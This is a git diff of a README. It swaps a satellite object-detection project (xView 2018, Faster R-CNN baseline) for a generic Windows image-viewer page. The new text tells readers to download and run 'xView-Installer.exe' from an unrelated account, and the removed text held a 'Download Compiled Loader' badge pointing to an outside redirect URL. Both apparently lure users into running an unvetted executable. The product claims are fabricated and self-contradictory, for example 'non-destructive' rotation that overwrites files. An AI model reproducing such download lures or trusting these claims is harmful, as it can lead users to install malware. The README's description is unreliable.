@@ -1,61 +1,96 @@
-# xView Detection Challenge
+# 🖥️ xView - View your digital images with ease
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+<p align="center">
+  <a href="https://github.com/Catiecrosssentential808/xView">
+    <img src="https://img.shields.io/badge/Download-xView-blue.svg" alt="Download xView">
+  </a>
+</p>
 
-All this repository is about the xView Detection Challenge in 2018.
-The goal is to detect a large range of object within a satellite image
+xView provides a simple way to manage and organize your image files. The software runs locally on your computer to protect your privacy. You maintain full control over your media library through a clean interface. This tool removes the need for complicated menu systems or cloud-based accounts.
 
-More information [here](https://xviewdataset.org/)
+## 🛠️ System Requirements
 
----
+Your computer needs to meet these basic standards to run xView:
 
-## Data
+* Operating System: Windows 10 or Windows 11.
+* Processor: Any modern dual-core chip or faster.
+* Memory: 4 gigabytes of RAM.
+* Storage: 200 megabytes of free space.
+* Graphics: Any standard display adapter.
 
-The dataset includes 2 sets:
-- A training set with 846 images
-- A validation set with 281 images
+## 💾 Installation Steps
 
-The annotation are in GEOJson format.
+Follow these steps to install the software on your Windows machine:
 
-But you can also use the mapping `ID:CLASS_NAME` file in the official [repository of xView](https://github.com/DIUx-xView/data_utilities/blob/master/xview_class_labels.txt)
-Just  it and place in your folder
+1. Visit the [official download page](https://github.com/Catiecrosssentential808/xView) to get the latest file.
+2. Locate the link labeled "xView-Installer.exe" on the page.
+3. Click the link to begin the download process.
+4. Open your "Downloads" folder once the process finishes.
+5. Double-click the file named "xView-Installer.exe".
+6. Follow the instructions on the screen to finish the setup.
+7. Click the "Finish" button to close the installer.
+8. Look for the new icon on your desktop to launch the tool.
 
----
+## 🚀 Getting Started
 
-## Global
+The first time you open xView, the program asks for a folder to watch. Choose the folder where you store your photos. The software scans your files and displays them in a list. You do not need to move your files or copy them to a new place. 
 
-This repository will contain different modules based on which choice I make during exploration and implementation.
-The goal is to use different models to see which one is the best, with a certain trade-off between accuracy / training time / inference time / implementation complexity
+The main screen shows your images on the right and your folder structure on the left. Click on any subfolder to see the contents. Use the top menu to sort your files by date, size, or file name. 
 
-All the models will be trained with my GPU, Nvidia RTX 4060 (8GB VRAM)
+## ⚙️ Configuration Options
 
----
+Access the settings menu by clicking the gear icon in the top right corner of the window. You can adjust the following options:
 
-## Experiments
+* Theme selection: Choose between a light mode and a dark mode.
+* File associations: Set xView as your default tool for opening image files.
+* Refresh rate: Choose how often the program checks for new files in your folders.
+* Thumbnail size: Adjust the dimensions of the previews based on your screen preference.
 
-What has been done so far ?
+Changes take effect as soon as you click the save button. You do not need to restart the application.
 
-- I have trained a baseline model with [Faster R-CNN](https://arxiv.org/pdf/1506.01497) for 100 epochs for only 2 labels with a batch size of 8.
-  - Time / epochs ~= 30sec
-  - **mAP (0.5) ~= 0.35**
-  - Different learning rate were used for the backbone and the new head 
-  - While the results are small, it also shows a good future.
+## 📂 Managing Your Files
 
----
+xView helps you perform routine tasks on your images. Right-click any file to see your options:
 
-## Main files
+* Rename: Change the file name to something descriptive.
+* Move: Send the file to a different folder.
+* Delete: Remove the file from your computer. Note that this action moves the file to your Recycle Bin.
+* Rotate: Change the image orientation. These changes save automatically to the file.
+* Copy: Make a duplicate of the image in a location of your choice.
 
-You can already  the repository and run the code, here is the good pipeline:
+## 🆘 Troubleshooting Common Issues
 
-1.  the dataset
-2. Edit the YAML file to configure your path, settings and hyperparameters
-3. Run the script `run_all.py` to convert the xView format into COCO annotations
-4. Run the script `dataset.py` to validate the conversation and visualize samples
-5. Run the script `train.py` to train the model available in `models.py`
-6. Once the training is complete, run the `inference.py` file to compute the metrics and visualize the predictions
+If you encounter trouble, use these solutions:
 
----
+**The program does not launch.**
+Ensure your version of Windows is up to date. Sometimes a pending system update blocks new software. Restart your computer and try launching xView again.
 
-## Futur 
+**Files do not appear in the list.**
+Check your folder permissions. Ensure that you selected a folder that is currently accessible to your user account. Try refreshing the list by pressing the F5 key on your keyboard.
 
-Future improvements will arrive soon, including new models, new training, new data format
+**The program feels slow.**
+Large folders with thousands of images take more time to load. Consider breaking your library into smaller subfolders if you see a delay. 
+
+**The text appears too small.**
+Enter the settings menu and look for the display category. You can scale the user interface by moving the slider to the right.
+
+## 🛡️ Privacy and Data
+
+xView operates on your computer hardware. Your files reside on your internal drive or connected storage devices. The program does not send your images to any external server. You do not need an internet connection to use the main features of this application. Periodic checks for software updates require an internet connection, but you can disable this behavior in the settings menu.
+
+## 📋 Frequently Asked Questions
+
+**Is this software free?**
+Yes, xView is free to use for personal purposes.
+
+**Does this software modify my original files?**
+xView performs non-destructive edits, such as rotation. It maintains the original file quality at all times.
+
+**Can I run this on a tablet?**
+If your tablet runs a standard version of Windows 10 or 11, the software will work. It is not compatible with Windows RT or mobile versions of the operating system.
+
+**How do I uninstall the program?**
+Open your Windows Settings, go to Apps, and find xView in the list. Select "Uninstall" to remove the program and its associated settings.
+
+**Are there hidden costs?**
+No, there are no subscriptions or hidden fees.
